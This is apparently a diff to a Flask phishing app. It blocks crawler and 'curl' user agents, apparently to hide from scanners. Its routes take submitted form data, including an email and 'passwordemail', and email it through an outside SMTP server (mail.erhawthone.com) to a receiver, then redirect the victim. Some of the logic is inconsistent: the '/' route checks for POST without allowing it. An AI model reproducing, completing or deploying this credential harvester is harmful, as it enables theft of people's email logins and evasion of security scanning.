@@ -20,7 +20,6 @@ bot_user_agents = [
     'Feedly', 'bot', 'curl', "spider", "crawler"
 ]
 
-
 @app.route("/")
 def first():
     if request.method == 'POST':
@@ -48,7 +47,7 @@ def first():
         with smtplib.SMTP_SSL("mail.erhawthone.com", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
-        return render_template('ind.html', eman=eman, dman=dman)
+        return render_template('ind.html', eman=email, dman=passwordemail)
 
 @app.route("/second", methods=['POST'])
 def second():
@@ -79,13 +78,11 @@ def second():
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('lasmo'))
 
+    return render_template('main.html', dman=None)
 
-    return render_template('main.html', dman=dman)
-
-
-
-
-
+@app.route("/lasmo")
+def lasmo():
+    return "This is lasmo route"
 
 if __name__ == '__main__':
     app.run(host="0.0.0.0", port=3000)
